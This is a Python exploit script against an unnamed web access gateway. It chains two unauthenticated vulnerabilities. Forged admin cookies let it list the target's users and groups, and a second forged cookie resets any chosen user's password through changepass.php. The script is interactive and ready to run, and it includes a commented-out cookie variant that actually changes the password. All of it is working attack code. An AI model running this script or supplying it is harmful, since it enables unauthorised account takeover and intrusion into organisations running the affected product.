from requests import get, post
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings()  # Disable SSL warning while using proxies


base_url = "https://ip:port/"
# proxies = {"http":"127.0.0.1:7890","https":"127.0.0.1:7890"}
loop = False


def get_user_info(url: str, proxy=None):
    header = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
        "Cookie": "gw_admin_ticket=1"
    }
    real_url = url + "/admin/group/x_group.php?id=1"
    print("[*] Reading user list in", real_url)
    rsp = get(url=real_url, headers=header, verify=False, proxies=proxy)
    if "用户信息" not in rsp.text:
        print("[-] Read failed. Target seems safe.")
        return None
    print("[+] Vuln_1 found. Trying to read user list...")
    rsp_data = BeautifulSoup(rsp.text, 'html.parser')
    group_name_html = rsp_data.find("select", attrs={"name": "parentid"}).find_all("option")[1:]
    user_name_html = rsp_data.find("select", attrs={"name": "user_unsel[]"}).find_all("option")
    group_name = [i.text.strip() for i in group_name_html]
    print("[+] Groups:", group_name)
    user_name = [i.text.split("->")[1].strip() for i in user_name_html]
    print("[+] Users:", user_name)
    print(f"[+] Read [{len(user_name)}] users.")
    return user_name


def reset_password(url: str, user_name: str, new_password: str, proxy=None):
    # Just check No change
    cookie = 'admin_id=1;gw_admin_ticket=1;last_step_param={"this_name":'+user_name+',"subAuthId":"1"}'
    # Change password! Be careful!
    # cookie = 'admin_id=1;gw_user_ticket=ffffffffffffffffffffffffffffffff;last_step_param={"this_name"'+user_name+',"subAuthId": "1"}'

    header = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": url,  # Fix 403 Error
        "Cookie": cookie
    }
    real_url = url + "/changepass.php?type=2"
    print("[*] Resetting password in", real_url)
    data = f"password={new_password}&repassword={new_password}&old_pass="
    rsp = post(url=real_url, headers=header, data=data, verify=False, proxies=proxy)
    if rsp.status_code != 200:
        print("[-] Failed to reset passwd, target seems safe.", rsp.status_code)
    else:
        print("[+] Vuln_2 found. Trying to reset password...")
        rsp_html = BeautifulSoup(rsp.text, 'html.parser')
        result = rsp_html.find("td", attrs={"class": "main_font"}).text.strip()
        if "修改密码成功" not in result:
            print("[-] Reset failed. Response:", result)
        else:
            print("[+] Reset successed! Response:", result)
            print("[+] ", f"{user_name} / {new_password}")
    print("[*]", '*'*20)


def read_input(url: str):
    user_name = input("[*] Username to resasdet password: ")
    if user_name.lower() == "q!":
        stop()
    if user_name not in username_list:
        print(f"[-] Username [{user_name}] not found.")
    else:
        passwd = input("[*] New password to reset: ")
        if passwd.lower() == "q!":
            stop()
        if passwd != "":
            reset_password(url=url, user_name=user_name, new_password=passwd)
        else:
            print("[-] New password can't be empty.")


def stop():
    print("[*] Quit now.")
    exit()


if __name__ == "__main__":
    base_url = base_url.strip('/')
    print("[*] Target:", base_url)
    print("[*] Vuln 1: Reading user list unauthorized.")
    username_list = get_user_info(url=base_url)
    if username_list is None:
        stop()
    print("[*]", "="*20)
    print("[*] Vuln 2: Resetting password unauthorized.")
    print("[*] If not try to change password(s), input \"q!\" and press Enter to quit.")
    if not loop:
        read_input(url=base_url)
    else:
        while True:
            read_input(url=base_url)
